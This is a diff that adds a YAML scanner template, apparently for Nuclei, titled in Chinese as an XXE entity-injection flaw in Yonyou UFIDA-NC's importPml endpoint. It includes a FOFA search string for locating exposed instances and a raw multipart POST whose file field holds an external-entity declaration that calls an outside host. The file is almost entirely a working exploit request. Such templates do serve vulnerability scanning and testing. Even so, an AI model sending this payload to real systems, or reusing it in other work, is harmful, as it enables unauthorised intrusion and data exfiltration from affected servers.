@@ -1,0 +1,33 @@
+id: poc-gzs1nvo0ci8eva0k
+info:
+  name: 用友-UFIDA-NC importPml存在XXE实体注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzs1nvo0ci8eva0k'
+  tags: xxe,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzs1nvo0ci8eva0k
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybXJ4bi5uZXQ
+
+
+    ------WebKitFormBoundarybXJ4bi5uZXQ
+
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sblsdohzht.iyhc.eu.org/"> %remote;]>
+
+    ------WebKitFormBoundarybXJ4bi5uZXQ--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
